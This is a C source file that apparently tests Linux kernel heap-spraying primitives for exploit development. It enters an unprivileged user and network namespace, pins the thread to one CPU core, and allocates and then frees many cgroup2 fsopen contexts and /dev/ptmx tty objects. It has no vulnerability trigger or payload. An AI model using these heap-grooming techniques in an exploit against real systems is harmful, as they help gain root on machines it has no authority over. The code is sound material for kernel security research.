#define _GNU_SOURCE
#include <arpa/inet.h>
#include <sched.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <err.h>
#include <time.h>
#include <libmnl/libmnl.h>
#include <libnftnl/chain.h>
#include <libnftnl/expr.h>
#include <libnftnl/rule.h>
#include <libnftnl/table.h>
#include <libnftnl/set.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>
#include <sys/types.h>
#include <signal.h>
#include <net/if.h>
#include <asm/types.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <sys/socket.h>
#include <linux/ethtool.h>
#include <linux/sockios.h>
#include <sys/xattr.h>
#include <unistd.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/ipc.h>
#include <linux/keyctl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <time.h>
#include <errno.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>

void
unshare_setup(uid_t uid, gid_t gid)
{
    int temp, ret;
    char edit[0x100];

    unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);

    temp = open("/proc/self/setgroups", O_WRONLY);
    ret = write(temp, "deny", strlen("deny"));
    if (ret < 0) {
        perror("write");
    }
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    ret = write(temp, edit, strlen(edit));
    if (ret < 0) {
        perror("write2");
    }
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    ret = write(temp, edit, strlen(edit));
    if (ret < 0) {
        perror("write3");
    }
    close(temp);

    return;
}

void
schedule_to_core(int coreid)
{
    cpu_set_t mask;

    printf("Assigning thread %d to cpu core %d\n", gettid(), coreid);

    CPU_ZERO(&mask);
    CPU_SET(coreid, &mask);

    if (sched_setaffinity(0, sizeof(mask), &mask) < 0) {
        perror("[!] sched_setaffinity()");
        exit(EXIT_FAILURE);
    }
}

/* Hope -1 isn't a syscall */
#ifndef __NR_fsopen
 #define __NR_fsopen -1
#endif
#ifndef __NR_fsmount
 #define __NR_fsmount -1
#endif
#ifndef __NR_fsconfig
 #define __NR_fsconfig -1
#endif
#ifndef __NR_move_mount
 #define __NR_move_mount -1
#endif

int
fsopen(const char * fs_name, unsigned int flags)
{
    return syscall(__NR_fsopen, fs_name, flags);
}

void
cgroup_spray(int spray_count, int * array_cgroup, int start_index, int thread_index)
{
    printf("Allocating %d cgroups...\n", spray_count);
    int i = 0;
    for (i = 0; i < spray_count; i++) {
        int fd = fsopen("cgroup2", 0);
        if (-1 == fd) {
            printf("WARNING: failed to spray cgroup %d/%d [thread%d], stopping spray earlier\n", i, spray_count, thread_index);
            perror("fsopen()");
            break;
        }

        array_cgroup[start_index+i] = fd;
    }
}

void
cgroup_free(int fd)
{
    close(fd);
}

void
cgroup_free_array(int * cgroup, int count)
{
    printf("Freeing %d cgroups...\n", count);
    for (int i = 0; i < count; i++) {
        cgroup_free(cgroup[i]);
    }
}

int
tty_alloc()
{
    return open("/dev/ptmx", O_RDWR|O_NOCTTY);
}

void
tty_free(int fd)
{
    close(fd);
}

int *
tty_spray(int spray_count, int * tty_fds, int tty_array_size, int start_index, int * p_new_tty_array_size)
{
    printf("Allocating %d tty\n", spray_count);
    if (!tty_fds) {
        tty_fds = calloc(sizeof(int), tty_array_size);
    }

    for (int i = 0; i < spray_count; i++) {
        if ((tty_fds[start_index + i] = tty_alloc()) < 0) {
            printf("WARNING: failed to spray tty %d/%d, stopping spray earlier\n", i, spray_count);
            *p_new_tty_array_size = start_index + i;
            return tty_fds;
        }
    }
    return tty_fds;
}

int
tty_free_array(int * tty_fds, int tty_count)
{
    printf("Freeing %d tty...\n", tty_count);
    for (int i = 0; i < tty_count; i++)
    {
        //printf("Closing tty_fds[%d]\n", tty_fds[i]);
        tty_free(tty_fds[i]);
    }
    return 0;
}

int main() //int argc, char* argv[])
{
    unshare_setup(getuid(), getgid());
    schedule_to_core(0);

#ifdef TEST1
    int cgroups_spray_size = 10; //400;
    int * cgroups_spray_array = calloc(sizeof(int), cgroups_spray_size);
    cgroup_spray(cgroups_spray_size, cgroups_spray_array, 0, 0);

    printf("Hit a key to free the cgroups\n");
    getchar();
    cgroup_free_array(cgroups_spray_array, cgroups_spray_size);
#endif

#ifdef TEST2
    int tty_spray_size = 400; // 10;
    int * tty_array = tty_spray(tty_spray_size, NULL, tty_spray_size, 0, &tty_spray_size);

    printf("Hit a key to free the tty\n");
    getchar();
    tty_free_array(tty_array, tty_spray_size);
#endif

}
